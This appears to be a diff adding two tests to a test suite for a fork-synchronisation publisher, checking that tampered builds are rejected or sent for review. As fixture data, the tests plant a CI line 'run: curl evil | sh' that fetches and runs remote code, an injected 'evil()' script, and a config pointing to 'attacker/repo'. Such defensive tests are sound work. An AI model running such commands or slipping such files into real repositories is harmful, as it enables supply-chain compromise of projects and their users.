@@ -129,6 +129,47 @@ describe("the publisher does not take the build's word for it", () => {
     expect(await fx.remoteHead("forklift/sync")).toBeNull();
   });
 
+  it("refuses a build that changes a file the fork kept under a dropped path", async () => {
+    fx = await makeFixture({ "app.txt": "one\n", "ci/build.yml": "v1\n" });
+    // The fork drops upstream's CI but keeps a workflow of its own there.
+    await fx.forkCommit({ "ci/build.yml": null, "ci/fork.yml": "run: fork tests\n" }, "fork: own CI");
+    await fx.configure("drop: [ci/**]\n");
+    await fx.commit(fx.upstream, { "new.txt": "theirs\n" }, "upstream: add new.txt");
+    const out = path.join(fx.root, "build.bundle");
+    await runBuildOnly({ cwd: fx.fork, out });
+    const context = await loadContext({ cwd: fx.fork });
+    const report = await readHandoff(fx.fork, out);
+    const forkHead = await fx.remoteHead();
+    report.merge!.build.tree = await treeWith(fx.fork, report.merge!.build.tree, "ci/fork.yml", "run: curl evil | sh\n");
+
+    const result = await publish(context, report);
+
+    expect(result.outcome).toBe("rejected");
+    expect(result.breaches).toEqual(["ci/fork.yml was changed, but matches `drop`: the fork's copy must stay as it is."]);
+    expect(await fx.remoteHead()).toBe(forkHead);
+    expect(await fx.remoteHead("forklift/sync")).toBeNull();
+  });
+
+  it("sends a build to review when it adds a file of its own under a path the fork owns", async () => {
+    fx = await makeFixture({ "app.txt": "one\n", "assets/logo.txt": "upstream logo\n" });
+    await fx.forkCommit({ "assets/logo.txt": "fork logo\n" }, "fork: own logo");
+    await fx.configure("ours: [assets/**]\n");
+    await fx.commit(fx.upstream, { "new.txt": "theirs\n" }, "upstream: add new.txt");
+    const out = path.join(fx.root, "build.bundle");
+    await runBuildOnly({ cwd: fx.fork, out });
+    const context = await loadContext({ cwd: fx.fork });
+    const report = await readHandoff(fx.fork, out);
+    const forkHead = await fx.remoteHead();
+    // Not from upstream, not from the fork: it only looks covered by `ours`.
+    report.merge!.build.tree = await treeWith(fx.fork, report.merge!.build.tree, "assets/extra.js", "evil()\n");
+
+    const result = await publish(context, report);
+
+    expect(result.outcome).toBe("proposed");
+    expect(result.judged).toEqual(["assets/extra.js"]);
+    expect(await fx.remoteHead()).toBe(forkHead);
+  });
+
   it("refuses a build that rewrites the fork's rules", async () => {
     const { context, report, forkHead } = await built();
     report.merge!.build.tree = await treeWith(fx.fork, report.merge!.build.tree, "forklift.yaml", "upstream: attacker/repo\n");
